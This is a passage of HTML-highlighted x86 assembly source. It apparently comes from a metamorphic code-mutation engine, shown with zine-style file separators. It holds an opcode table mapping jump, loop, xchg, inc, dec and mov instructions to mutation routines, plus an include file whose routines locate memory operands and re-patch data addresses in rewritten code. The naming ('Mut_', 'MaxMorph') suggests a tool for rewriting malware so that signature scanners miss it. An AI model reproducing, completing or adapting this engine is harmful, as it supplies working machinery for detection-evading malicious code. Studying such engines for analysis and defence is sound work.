</span><span class="sc5">TryIncDec</span><span class="sc0">   </span><span class="sc9">endp</span><span class="sc0">
</span><span class="sc1">;---------------------------------------------------------------------</span><span class="sc0">

</span><span class="sc5">MutTbl</span><span class="sc0">  </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">1</span><span class="sc0">
    </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">0EBh</span><span class="sc0">
    </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">Mut_ShortJmp2</span><span class="sc0">

    </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">16</span><span class="sc0">
    </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">70h</span><span class="sc4">,</span><span class="sc2">71h</span><span class="sc4">,</span><span class="sc2">72h</span><span class="sc4">,</span><span class="sc2">73h</span><span class="sc4">,</span><span class="sc2">74h</span><span class="sc4">,</span><span class="sc2">75h</span><span class="sc4">,</span><span class="sc2">76h</span><span class="sc4">,</span><span class="sc2">77h</span><span class="sc0">
    </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">78h</span><span class="sc4">,</span><span class="sc2">79h</span><span class="sc4">,</span><span class="sc2">7Ah</span><span class="sc4">,</span><span class="sc2">7Bh</span><span class="sc4">,</span><span class="sc2">7Ch</span><span class="sc4">,</span><span class="sc2">7Dh</span><span class="sc4">,</span><span class="sc2">7Eh</span><span class="sc4">,</span><span class="sc2">7Fh</span><span class="sc0">
    </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">Mut_ShortJmp</span><span class="sc0">

    </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">3</span><span class="sc0">
    </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">0E0h</span><span class="sc4">,</span><span class="sc2">0E1h</span><span class="sc4">,</span><span class="sc2">0E2h</span><span class="sc0">
    </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">Mut_Loop</span><span class="sc0">
    
    </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">4</span><span class="sc0">
</span><span class="sc5">ZeroTbl</span><span class="sc0"> </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">31h</span><span class="sc4">,</span><span class="sc2">33h</span><span class="sc4">,</span><span class="sc2">29h</span><span class="sc4">,</span><span class="sc2">2Bh</span><span class="sc0">
    </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">Mut_CheckZero</span><span class="sc0">

    </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">8</span><span class="sc0">
    </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">0B8h</span><span class="sc4">,</span><span class="sc2">0B9h</span><span class="sc4">,</span><span class="sc2">0BAh</span><span class="sc4">,</span><span class="sc2">0BBh</span><span class="sc4">,</span><span class="sc2">0BCh</span><span class="sc4">,</span><span class="sc2">0BDh</span><span class="sc4">,</span><span class="sc2">0BEh</span><span class="sc4">,</span><span class="sc2">0BFh</span><span class="sc0">
    </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">Mut_MovZero</span><span class="sc0">

    </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">7</span><span class="sc0">
    </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">91h</span><span class="sc4">,</span><span class="sc2">92h</span><span class="sc4">,</span><span class="sc2">93h</span><span class="sc4">,</span><span class="sc2">94h</span><span class="sc4">,</span><span class="sc2">95h</span><span class="sc4">,</span><span class="sc2">96h</span><span class="sc4">,</span><span class="sc2">97h</span><span class="sc0">
    </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">Mut_Xchg</span><span class="sc0">

    </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">8</span><span class="sc0">
    </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">40h</span><span class="sc4">,</span><span class="sc2">41h</span><span class="sc4">,</span><span class="sc2">42h</span><span class="sc4">,</span><span class="sc2">43h</span><span class="sc4">,</span><span class="sc2">44h</span><span class="sc4">,</span><span class="sc2">45h</span><span class="sc4">,</span><span class="sc2">46h</span><span class="sc4">,</span><span class="sc2">47h</span><span class="sc0">
    </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">Mut_Inc</span><span class="sc0">

    </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">8</span><span class="sc0">
    </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">48h</span><span class="sc4">,</span><span class="sc2">49h</span><span class="sc4">,</span><span class="sc2">4Ah</span><span class="sc4">,</span><span class="sc2">4Bh</span><span class="sc4">,</span><span class="sc2">4Ch</span><span class="sc4">,</span><span class="sc2">4Dh</span><span class="sc4">,</span><span class="sc2">4Eh</span><span class="sc4">,</span><span class="sc2">4Fh</span><span class="sc0">
    </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">Mut_Dec</span><span class="sc0">

    </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">1</span><span class="sc0">
    </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">83h</span><span class="sc0">
    </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">TryIncDec</span><span class="sc0">

    </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc0">

</span><span class="sc4">--[</span><span class="sc0"> </span><span class="sc5">Pdata.inc</span><span class="sc0"> </span><span class="sc4">]---------------------------------------------------------------</span><span class="sc0">

</span><span class="sc1">; Different procedures to work with data</span><span class="sc0">

</span><span class="sc5">MaxData</span><span class="sc0"> </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc2">700</span><span class="sc0">

</span><span class="sc5">AddData</span><span class="sc0"> </span><span class="sc9">proc</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">esi</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc0">
    </span><span class="sc6">Call</span><span class="sc0">    </span><span class="sc5">CheckDataOpcode</span><span class="sc0">
    </span><span class="sc6">jc</span><span class="sc0">  </span><span class="sc5">NotData</span><span class="sc0">
    </span><span class="sc6">Call</span><span class="sc0">    </span><span class="sc5">AddDta</span><span class="sc0">
</span><span class="sc5">NotData</span><span class="sc4">:</span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">
    </span><span class="sc6">ret</span><span class="sc0">
</span><span class="sc5">AddData</span><span class="sc0"> </span><span class="sc9">endp</span><span class="sc0">

</span><span class="sc5">AddDta</span><span class="sc0">  </span><span class="sc9">proc</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,[</span><span class="sc5">Datan</span><span class="sc4">][</span><span class="sc8">ebp</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,[</span><span class="sc5">Datas</span><span class="sc4">][</span><span class="sc8">ebp</span><span class="sc4">][</span><span class="sc8">edi</span><span class="sc4">*</span><span class="sc2">8</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">esi</span><span class="sc0">
    </span><span class="sc6">stosd</span><span class="sc0">
    </span><span class="sc6">Call</span><span class="sc0">    </span><span class="sc5">GetDataAddr</span><span class="sc0">
    </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc5">xSrc</span><span class="sc4">][</span><span class="sc8">ebp</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">jb</span><span class="sc0">  </span><span class="sc5">NotOur</span><span class="sc0">
    </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc5">MaxMorph</span><span class="sc4">][</span><span class="sc8">ebp</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">ja</span><span class="sc0">  </span><span class="sc5">NotOur</span><span class="sc0">
    </span><span class="sc6">stosd</span><span class="sc0">
    </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">Datan</span><span class="sc4">][</span><span class="sc8">ebp</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc5">NotOur</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">ret</span><span class="sc0">
</span><span class="sc5">AddDta</span><span class="sc0">  </span><span class="sc9">endp</span><span class="sc0">
</span><span class="sc1">;--------------------------------------------------------------------</span><span class="sc0">
</span><span class="sc5">CheckDataAddr</span><span class="sc0">   </span><span class="sc9">proc</span><span class="sc0">        </span><span class="sc1">; ESi - Addr</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,[</span><span class="sc5">Datan</span><span class="sc4">][</span><span class="sc8">ebp</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">or</span><span class="sc0">  </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc8">ecx</span><span class="sc0">
    </span><span class="sc6">jz</span><span class="sc0">  </span><span class="sc5">NData</span><span class="sc0">
    </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,[</span><span class="sc5">Datas</span><span class="sc4">][</span><span class="sc8">ebp</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc5">CheckData</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebx</span><span class="sc4">],</span><span class="sc8">esi</span><span class="sc0">
    </span><span class="sc6">jnz</span><span class="sc0"> </span><span class="sc5">NxData</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebx</span><span class="sc4">],</span><span class="sc8">edi</span><span class="sc0">
</span><span class="sc5">NxData</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebx</span><span class="sc4">][</span><span class="sc2">4</span><span class="sc4">],</span><span class="sc8">esi</span><span class="sc0">
    </span><span class="sc6">jnz</span><span class="sc0"> </span><span class="sc5">NPoint</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebx</span><span class="sc4">][</span><span class="sc2">4</span><span class="sc4">],</span><span class="sc8">edi</span><span class="sc0">
</span><span class="sc5">NPoint</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc2">8</span><span class="sc0">
    </span><span class="sc6">loop</span><span class="sc0">    </span><span class="sc5">CheckData</span><span class="sc0">
</span><span class="sc5">NData</span><span class="sc4">:</span><span class="sc0">  </span><span class="sc6">ret</span><span class="sc0">
</span><span class="sc5">CheckDataAddr</span><span class="sc0">   </span><span class="sc9">endp</span><span class="sc0">
</span><span class="sc1">;--------------------------------------------------------------------</span><span class="sc0">
</span><span class="sc5">PatchData</span><span class="sc0">   </span><span class="sc9">proc</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,[</span><span class="sc5">Datan</span><span class="sc4">][</span><span class="sc8">ebp</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">or</span><span class="sc0">  </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc8">ecx</span><span class="sc0">
    </span><span class="sc6">jz</span><span class="sc0">  </span><span class="sc5">NoJmp</span><span class="sc0">
    </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,[</span><span class="sc5">Datas</span><span class="sc4">][</span><span class="sc8">ebp</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc5">DataPatch</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">lodsd</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">esi</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">xchg</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">esi</span><span class="sc0">
    </span><span class="sc6">Call</span><span class="sc0">    </span><span class="sc5">PointData</span><span class="sc0">
    </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">
    </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">
    </span><span class="sc6">lodsd</span><span class="sc0">

</span><span class="sc1">;   sub eax,[xDst][ebp]</span><span class="sc0">

    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebx</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">loop</span><span class="sc0">    </span><span class="sc5">DataPatch</span><span class="sc0">
    </span><span class="sc6">ret</span><span class="sc0">
</span><span class="sc5">PatchData</span><span class="sc0">   </span><span class="sc9">endp</span><span class="sc0">
</span><span class="sc1">;--------------------------------------------------------------------</span><span class="sc0">
</span><span class="sc5">CheckDataOpcode</span><span class="sc0"> </span><span class="sc9">proc</span><span class="sc0">
    </span><span class="sc6">Call</span><span class="sc0">    </span><span class="sc5">PointData</span><span class="sc0">
    </span><span class="sc6">or</span><span class="sc0">  </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">jz</span><span class="sc0">  </span><span class="sc5">BadR</span><span class="sc0">
    </span><span class="sc6">clc</span><span class="sc0">
    </span><span class="sc6">ret</span><span class="sc0">
</span><span class="sc5">BadR</span><span class="sc4">:</span><span class="sc0">   </span><span class="sc6">stc</span><span class="sc0">
    </span><span class="sc6">ret</span><span class="sc0">
</span><span class="sc5">CheckDataOpcode</span><span class="sc0"> </span><span class="sc9">endp</span><span class="sc0">

</span><span class="sc5">GetDataAddr</span><span class="sc0"> </span><span class="sc9">proc</span><span class="sc0">
    </span><span class="sc6">Call</span><span class="sc0">    </span><span class="sc5">PointData</span><span class="sc0">
    </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">esi</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc8">eax</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc5">xBase</span><span class="sc4">][</span><span class="sc8">ebp</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc5">xSrc</span><span class="sc4">][</span><span class="sc8">ebp</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">ret</span><span class="sc0">
</span><span class="sc5">GetDataAddr</span><span class="sc0"> </span><span class="sc9">endp</span><span class="sc0">
</span><span class="sc1">;--------------------------------------------------------------------</span><span class="sc0">
</span><span class="sc5">PointData</span><span class="sc0">   </span><span class="sc9">proc</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">esi</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc8">esi</span><span class="sc0">
    </span><span class="sc6">lodsb</span><span class="sc0">
    </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,[</span><span class="sc5">DataTbl</span><span class="sc4">][</span><span class="sc8">ebp</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc5">FindData</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">movzx</span><span class="sc0">   </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc2">1</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">or</span><span class="sc0">  </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc8">ecx</span><span class="sc0">
    </span><span class="sc6">jz</span><span class="sc0">  </span><span class="sc5">NotDataOpcode</span><span class="sc0">
    </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc0">
</span><span class="sc6">repne</span><span class="sc0">   </span><span class="sc6">scasb</span><span class="sc0">
    </span><span class="sc6">jnz</span><span class="sc0"> </span><span class="sc5">SkipThatBlock</span><span class="sc0">
    </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc8">ecx</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc8">edi</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">ebp</span><span class="sc0">
    </span><span class="sc6">Call</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">ebx</span><span class="sc0">
    </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">esi</span><span class="sc0">
    </span><span class="sc6">ret</span><span class="sc0">
</span><span class="sc5">SkipThatBlock</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc2">4</span><span class="sc0">
    </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">FindData</span><span class="sc0">
</span><span class="sc5">NotDataOpcode</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">
    </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">ret</span><span class="sc0">
</span><span class="sc5">PointData</span><span class="sc0">   </span><span class="sc9">endp</span><span class="sc0">

</span><span class="sc5">DataComplex</span><span class="sc0"> </span><span class="sc9">proc</span><span class="sc0">
    </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc8">edx</span><span class="sc0">
    </span><span class="sc6">lodsb</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">and</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">00000111b</span><span class="sc0">
    </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">4</span><span class="sc0">
    </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">jnz</span><span class="sc0"> </span><span class="sc5">xHaveData</span><span class="sc0">
    </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc0">
</span><span class="sc5">xHaveData</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">shr</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">6</span><span class="sc0">
    </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">2</span><span class="sc0">
    </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">jz</span><span class="sc0">  </span><span class="sc5">HaveData</span><span class="sc0">
    
    </span><span class="sc6">and</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">11000111b</span><span class="sc0">
    </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">5</span><span class="sc0">
    </span><span class="sc6">jz</span><span class="sc0">  </span><span class="sc5">HaveData</span><span class="sc0">

    </span><span class="sc6">or</span><span class="sc0">  </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc8">edx</span><span class="sc0">
    </span><span class="sc6">jz</span><span class="sc0">  </span><span class="sc5">NoData</span><span class="sc0">
    </span><span class="sc6">lodsb</span><span class="sc0">
    </span><span class="sc6">and</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">111b</span><span class="sc0">
    </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">5</span><span class="sc0">
    </span><span class="sc6">jz</span><span class="sc0">  </span><span class="sc5">RetData</span><span class="sc0">

</span><span class="sc5">NoData</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">ret</span><span class="sc0">
</span><span class="sc5">HaveData</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">or</span><span class="sc0">  </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc8">edx</span><span class="sc0">
    </span><span class="sc6">jz</span><span class="sc0">  </span><span class="sc5">RetData</span><span class="sc0">
    </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">
</span><span class="sc5">RetData</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc8">esi</span><span class="sc0">
    </span><span class="sc6">ret</span><span class="sc0">
</span><span class="sc5">ExtendedData</span><span class="sc4">:</span><span class="sc0">
</span><span class="sc5">DataComplex</span><span class="sc0"> </span><span class="sc9">endp</span><span class="sc0">

</span><span class="sc5">DataReturn1</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">
    </span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc5">xOpcode</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">lodsb</span><span class="sc0">
    </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">0A3h</span><span class="sc0">
    </span><span class="sc6">jz</span><span class="sc0">  </span><span class="sc5">DataComplex</span><span class="sc0">
    </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">0A4h</span><span class="sc0">
    </span><span class="sc6">jz</span><span class="sc0">  </span><span class="sc5">DataComplex</span><span class="sc0">
    </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">0A5h</span><span class="sc0">
    </span><span class="sc6">jz</span><span class="sc0">  </span><span class="sc5">DataComplex</span><span class="sc0">
    </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">0ABh</span><span class="sc0">
    </span><span class="sc6">jz</span><span class="sc0">  </span><span class="sc5">DataComplex</span><span class="sc0">
    </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">0ACh</span><span class="sc0">
    </span><span class="sc6">jz</span><span class="sc0">  </span><span class="sc5">DataComplex</span><span class="sc0">
    </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">0ADh</span><span class="sc0">
    </span><span class="sc6">jz</span><span class="sc0">  </span><span class="sc5">DataComplex</span><span class="sc0">
    </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">0AFh</span><span class="sc0">
    </span><span class="sc6">jz</span><span class="sc0">  </span><span class="sc5">DataComplex</span><span class="sc0">

    </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">3</span><span class="sc0">
    </span><span class="sc6">ja</span><span class="sc0">  </span><span class="sc5">dS1</span><span class="sc0">
    </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
    </span><span class="sc6">jae</span><span class="sc0"> </span><span class="sc5">DataComplex</span><span class="sc0">

</span><span class="sc5">dS1</span><span class="sc4">:</span><span class="sc0">    </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">26h</span><span class="sc0">
    </span><span class="sc6">ja</span><span class="sc0">  </span><span class="sc5">dS2</span><span class="sc0">
    </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">20h</span><span class="sc0">
    </span><span class="sc6">jae</span><span class="sc0"> </span><span class="sc5">DataComplex</span><span class="sc0">

</span><span class="sc5">dS2</span><span class="sc4">:</span><span class="sc0">    </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">4Fh</span><span class="sc0">
    </span><span class="sc6">ja</span><span class="sc0">  </span><span class="sc5">dS3</span><span class="sc0">
    </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">40h</span><span class="sc0">
    </span><span class="sc6">jae</span><span class="sc0"> </span><span class="sc5">DataComplex</span><span class="sc0">

</span><span class="sc5">dS3</span><span class="sc4">:</span><span class="sc0">    </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">9Ah</span><span class="sc0">
    </span><span class="sc6">ja</span><span class="sc0">  </span><span class="sc5">DataComplex</span><span class="sc0">
    </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">90h</span><span class="sc0">
    </span><span class="sc6">jae</span><span class="sc0"> </span><span class="sc5">DataComplex</span><span class="sc0">

        </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">DataComplex</span><span class="sc0">

</span><span class="sc1">;----------------------------------------------------------------------</span><span class="sc0">
</span><span class="sc5">CheckVariable</span><span class="sc0">   </span><span class="sc9">proc</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc5">xAddOffset</span><span class="sc4">][</span><span class="sc8">ebp</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">esi</span><span class="sc0">
    </span><span class="sc6">jnz</span><span class="sc0"> </span><span class="sc5">NotIt</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">xAddOffset</span><span class="sc4">][</span><span class="sc8">ebp</span><span class="sc4">],</span><span class="sc8">edi</span><span class="sc0">
</span><span class="sc5">NotIt</span><span class="sc4">:</span><span class="sc0">  </span><span class="sc6">ret</span><span class="sc0">
</span><span class="sc5">CheckVariable</span><span class="sc0">   </span><span class="sc9">endp</span><span class="sc0">
</span><span class="sc1">;----------------------------------------------------------------------</span><span class="sc0">
</span><span class="sc5">DataTbl</span><span class="sc0"> </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">32</span><span class="sc0">
    </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">00h</span><span class="sc4">,</span><span class="sc2">02h</span><span class="sc4">,</span><span class="sc2">10h</span><span class="sc4">,</span><span class="sc2">12h</span><span class="sc4">,</span><span class="sc2">20h</span><span class="sc4">,</span><span class="sc2">22h</span><span class="sc4">,</span><span class="sc2">30h</span><span class="sc4">,</span><span class="sc2">32h</span><span class="sc0"> </span><span class="sc1">; ADD,ADC,AND,XOR</span><span class="sc0">
    </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">01h</span><span class="sc4">,</span><span class="sc2">03h</span><span class="sc4">,</span><span class="sc2">11h</span><span class="sc4">,</span><span class="sc2">13h</span><span class="sc4">,</span><span class="sc2">21h</span><span class="sc4">,</span><span class="sc2">23h</span><span class="sc4">,</span><span class="sc2">31h</span><span class="sc4">,</span><span class="sc2">33h</span><span class="sc0"> </span><span class="sc1">; OR ,SBB,SUB,CMP</span><span class="sc0">
    </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">08h</span><span class="sc4">,</span><span class="sc2">0Ah</span><span class="sc4">,</span><span class="sc2">18h</span><span class="sc4">,</span><span class="sc2">1Ah</span><span class="sc4">,</span><span class="sc2">28h</span><span class="sc4">,</span><span class="sc2">2Ah</span><span class="sc4">,</span><span class="sc2">38h</span><span class="sc4">,</span><span class="sc2">3Ah</span><span class="sc0">
